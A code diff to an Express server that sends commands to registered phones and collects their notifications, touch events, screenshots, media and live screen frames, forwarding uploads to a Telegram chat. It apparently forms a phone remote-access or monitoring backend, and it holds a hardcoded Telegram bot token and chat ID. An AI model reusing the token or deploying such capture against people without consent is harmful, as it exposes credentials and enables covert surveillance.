@@ -5,6 +5,7 @@
 const express = require('express');
 const cors = require('cors');
 const crypto = require('crypto');
+const { Readable } = require('stream');
 require('dotenv').config();
 
 const app = express();
@@ -29,6 +30,20 @@ const ONLINE_WINDOW_MS = 20 * 1000; // device online if lastSeen < 20s ago
 const notifBatches = new Map();
 const NOTIF_BATCH_CAP = 400;   // per-device cap
 const NOTIF_ENTRY_CAP = 16000;  // per-upload entry char cap
+const BATCH_TTL_MS = 30 * 60 * 1000; // device-level batch entries older than 30 min are swept
+
+// Sweep any device keys in a batch map (notifBatches/touchBatches) whose newest
+// entry is older than BATCH_TTL_MS. Prevents unbounded growth of device keys.
+function sweepBatches(map) {
+    const now = Date.now();
+    for (const [deviceId, arr] of map) {
+        let newest = 0;
+        for (const b of arr) { if (b.ts > newest) newest = b.ts; }
+        if (arr.length === 0 || (newest && now - newest > BATCH_TTL_MS)) {
+            map.delete(deviceId);
+        }
+    }
+}
 
 // v8.8: media store — phone uploads photos/videos/screenshots (base64) and the
 // laptop downloads them via a shareable URL. In-memory (Render free tier).
@@ -248,6 +263,11 @@ setInterval(() => {
     for (const [id, d] of devices) {
         if (now - d.lastSeen > 5 * 60 * 1000) devices.delete(id);
     }
+    // Sweep the unbounded in-memory stores (telegram media, live frames, batches).
+    sweepTelegramMediaStore();
+    sweepLiveFrames();
+    sweepBatches(notifBatches);
+    sweepBatches(touchBatches);
 }, 120000);
 
 // API Key Authentication
@@ -302,6 +322,10 @@ function pushFcmCommand(deviceId, commandId, command) {
         android: { priority: 'high' },
     }).then(() => {
         console.log(`[FCM] pushed to ${deviceId}: ${String(command).slice(0, 60)}`);
+        // v9.1: the command was just served via FCM — mark it claimed so the
+        // phone's periodic /mobile_poll fallback doesn't re-serve (double-exec).
+        const c = commands.get(commandId);
+        if (c) { c.claimed = true; c.servedAt = Date.now(); }
         return true;
     }).catch((e) => {
         console.error(`[FCM] push to ${deviceId} failed:`, e.message);
@@ -403,6 +427,7 @@ app.post('/send_command', authMiddleware, (req, res) => {
         device: device || 'mobile',
         target_device: target,
         timestamp: new Date().toISOString(),
+        claimed: false,   // v9.1: set true once served (poll or FCM) — prevents double-exec
     });
 
     // dashboard stats
@@ -433,6 +458,12 @@ app.post('/register_fcm', authMiddleware, (req, res) => {
     const fcm_token = (req.body && req.body.fcm_token) || '';
     if (!fcm_token) {
         return res.status(400).json({ error: 'fcm_token is required' });
+    }
+    // v9.1: prune any OTHER device entry bound to the same token (an FCM token
+    // can only belong to one device_id at a time), then bind this device. This
+    // keeps exactly one token per device and one device per token.
+    for (const [dId, reg] of fcmTokens) {
+        if (reg && reg.token === fcm_token) fcmTokens.delete(dId);
     }
     fcmTokens.set(device_id, { token: fcm_token, updatedAt: Date.now() });
     touchDevice(device_id);
@@ -476,14 +507,19 @@ app.post('/mobile_poll', authMiddleware, (req, res) => {
         || 'legacy';
     touchDevice(device_id);
 
-    // Oldest pending command for THIS device eduthu delete pannu
+    // Oldest PENDING (unclaimed) command for THIS device. Claimed commands
+    // (already served via FCM) are skipped so a slow command isn't re-run.
     const oldest = [...commands.entries()]
-        .filter(([, c]) => commandMatchesDevice(c, device_id))
+        .filter(([, c]) => !c.claimed && commandMatchesDevice(c, device_id))
         .sort((a, b) => new Date(a[1].timestamp) - new Date(b[1].timestamp))[0];
 
     if (oldest) {
         const [id, cmd] = oldest;
-        commands.delete(id);
+        // Mark claimed (rather than delete) so the poll fallback can't re-serve
+        // it. /mobile_result still stores the result and deletes it; the 10-min
+        // sweep removes commands that never produced a result.
+        cmd.claimed = true;
+        cmd.servedAt = Date.now();
         return res.json({ id, command: cmd.command, timestamp: cmd.timestamp, device_id });
     }
     res.json({ command: null, device_id });
@@ -560,6 +596,7 @@ app.post('/broadcast', authMiddleware, (req, res) => {
             device: 'mobile',
             target_device: devId,
             timestamp: new Date().toISOString(),
+            claimed: false,
         });
         ids.push(id);
     }
@@ -780,14 +817,79 @@ app.post('/touch_clear', authMiddleware, (req, res) => {
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8613025368:AAGp9UW8AdKnQXojcNlFB80C4v3CIPocixY';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '6620147919';
-// Telegram file_id -> {url, mime, filename, ts} so /media/:id can redirect
-// to the permanent Telegram download URL (no "expired" 404).
+// Telegram file_id -> {url, mime, filename, ts}. `url` is the api.telegram.org
+// file URL (which embeds the bot token). It is ONLY ever fetched server-side by
+// /media/:id and never returned to a client, so the token never leaks.
 const telegramMediaStore = new Map();
+const TELEGRAM_MEDIA_CAP = 500;                    // max cached telegram files
+const TELEGRAM_MEDIA_TTL_MS = 24 * 60 * 60 * 1000; // expire after 24h
 
-// Upload a file buffer to Telegram; return {id, link} or null.
-// Uses sendPhoto (image), sendVideo (video), or sendDocument (other) so the
-// returned download URL carries the RIGHT content-type (image/jpeg etc.) and
-// renders inline in the browser instead of forcing an octet-stream download.
+// Remove expired telegram entries (TTL) — called on add + periodic sweep.
+function sweepTelegramMediaStore() {
+    const now = Date.now();
+    for (const [id, e] of telegramMediaStore) {
+        if (!e.ts || now - e.ts > TELEGRAM_MEDIA_TTL_MS) telegramMediaStore.delete(id);
+    }
+}
+
+// Resolve a telegram file_id → file_path via getFile (used on upload & on
+// download-link expiry refresh). Returns the path or null on any error.
+async function fetchTelegramFilePath(fileId) {
+    try {
+        const gf = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${encodeURIComponent(fileId)}`);
+        const gdata = await gf.json();
+        if (gdata.ok && gdata.result && gdata.result.file_path) return gdata.result.file_path;
+    } catch (e) {
+        console.warn('[MEDIA] Telegram getFile refresh failed:', e.message);
+    }
+    return null;
+}
+
+// Stream a telegram file's bytes straight to the HTTP response (server-side
+// fetch → pipe). The bot token never leaves this process. Returns true once the
+// stream has been started, false if the telegram download failed.
+//
+// Telegram file links expire after ~1h. On a 404/expiry we re-resolve the
+// file_id via getFile (fetchTelegramFilePath), update the stored url, and retry
+// the download exactly once.
+async function pipeTelegramFile(res, fileId, entry) {
+    let url = entry.url;
+    if (!url) return false;
+
+    let fetched = null;
+    try {
+        fetched = await fetch(url);
+    } catch (e) {
+        console.warn('[MEDIA] Telegram download fetch failed:', e.message);
+        return false;
+    }
+
+    if ((fetched.status === 404 || fetched.status === 410) && fileId) {
+        const path = await fetchTelegramFilePath(fileId);
+        if (path) {
+            url = `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${path}`;
+            entry.url = url; // refresh the stored url (kept server-side only)
+            try {
+                fetched = await fetch(url);
+            } catch (e) {
+                fetched = null;
+            }
+        }
+    }
+
+    if (!fetched || !fetched.ok || !fetched.body) return false;
+    res.status(200);
+    res.set('Content-Type', entry.mime || 'application/octet-stream');
+    const fname = String(entry.filename || '').replace(/["\r\n]/g, '');
+    if (fname) res.set('Content-Disposition', `inline; filename="${fname}"`);
+    res.set('Cache-Control', 'public, max-age=86400');
+    Readable.fromWeb(fetched.body).pipe(res);
+    return true;
+}
+
+// Upload a file buffer to Telegram; return {id, url} or null.
+// Uses sendDocument so the download is served with the original resolution and
+// the returned content-type renders inline (see /media/:id).
 async function uploadToTelegram(buffer, mime, filename) {
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return null;
     try {
@@ -805,13 +907,12 @@ async function uploadToTelegram(buffer, mime, filename) {
             throw new Error('sendDocument failed: ' + String(sdata.description || 'unknown').slice(0, 200));
         }
         const fileId = sdata.result.document.file_id;
-        const gf = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${encodeURIComponent(fileId)}`);
-        const gdata = await gf.json();
-        if (!gdata.ok || !gdata.result || !gdata.result.file_path) {
-            throw new Error('getFile failed');
-        }
-        const link = `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${gdata.result.file_path}`;
-        return { id: fileId, link };
+        const filePath = await fetchTelegramFilePath(fileId);
+        if (!filePath) throw new Error('getFile failed');
+        // Build the file URL server-side. It embeds the bot token, so it is
+        // stored in the map (fetched only server-side) — never sent to a client.
+        const url = `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${filePath}`;
+        return { id: fileId, url };
     } catch (e) {
         console.warn('[MEDIA] Telegram upload failed:', e.message);
         return null;
@@ -844,15 +945,21 @@ app.post('/media_upload', authMiddleware, async (req, res) => {
     if (buffer && buffer.length > 0) {
         // 1) Telegram first — free unlimited cloud storage (permanent link).
         const tg = await uploadToTelegram(buffer, mime, filename);
-        if (tg && tg.link) {
-            telegramMediaStore.set(tg.id, { url: tg.link, mime, filename, ts: Date.now() });
-            console.log(`[${new Date().toISOString()}] MEDIA upload ${deviceId} → TELEGRAM: ${tg.link}`);
+        if (tg && tg.id) {
+            telegramMediaStore.set(tg.id, { url: tg.url, mime, filename, ts: Date.now() });
+            // Cap + TTL protection (unbounded-map guard).
+            sweepTelegramMediaStore();
+            while (telegramMediaStore.size > TELEGRAM_MEDIA_CAP) {
+                telegramMediaStore.delete(telegramMediaStore.keys().next().value);
+            }
+            console.log(`[${new Date().toISOString()}] MEDIA upload ${deviceId} → TELEGRAM (file_id ${tg.id})`);
             return res.json({
                 ok: true,
                 media_id: tg.id,
                 storage: 'telegram',
-                url: tg.link,
-                link: tg.link,
+                // Never expose the raw api.telegram.org/file/bot<TOKEN> URL —
+                // the proxied /media/:id path streams bytes server-side instead.
+                url: `/media/${tg.id}`,
             });
         }
 
@@ -888,12 +995,14 @@ app.post('/media_upload', authMiddleware, async (req, res) => {
 
 // Laptop → Server: download a media file by id (binary, for browser/download).
 // No auth middleware (so the shareable URL opens in a plain browser/download).
-app.get('/media/:id', (req, res) => {
-    // v8.11: Telegram-backed media → redirect to the permanent Telegram URL
-    // (so links never 404 / expire).
+app.get('/media/:id', async (req, res) => {
+    // Telegram-backed media → stream bytes server-side (never expose the bot
+    // token). On Telegram 404/expiry the path is refreshed via getFile + retried.
     const tg = telegramMediaStore.get(req.params.id);
     if (tg) {
-        return res.redirect(302, tg.url);
+        const ok = await pipeTelegramFile(res, req.params.id, tg);
+        if (ok) return;
+        return res.status(502).send('media fetch failed');
     }
     const m = mediaStore.get(req.params.id);
     if (!m) {
@@ -909,6 +1018,20 @@ app.get('/media/:id', (req, res) => {
 // ---------- v8.8: live screen share (frame poll → auto-refresh link) ----------
 
 const liveFrames = new Map();   // device_id -> {data_b64, ts}
+const LIVE_FRAME_TTL_MS = 60 * 1000;  // drop frames older than ~60s
+const LIVE_FRAMES_CAP = 50;           // max concurrent live devices
+
+// Sweep stale frames (TTL) and cap the number of device entries. Called on every
+// frame post + the periodic 2-min sweep so the map can't grow unbounded.
+function sweepLiveFrames() {
+    const now = Date.now();
+    for (const [id, f] of liveFrames) {
+        if (!f || !f.ts || now - f.ts > LIVE_FRAME_TTL_MS) liveFrames.delete(id);
+    }
+    while (liveFrames.size > LIVE_FRAMES_CAP) {
+        liveFrames.delete(liveFrames.keys().next().value);
+    }
+}
 
 // Phone → Server: upload a live screen frame (JPEG base64).
 app.post('/live_frame', authMiddleware, (req, res) => {
@@ -916,6 +1039,7 @@ app.post('/live_frame', authMiddleware, (req, res) => {
     const data = (req.body && req.body.data_b64) || '';
     if (!data) return res.json({ ok: false });
     liveFrames.set(deviceId, { data_b64: data, ts: Date.now() });
+    sweepLiveFrames();
     touchDevice(deviceId);
     res.json({ ok: true });
 });
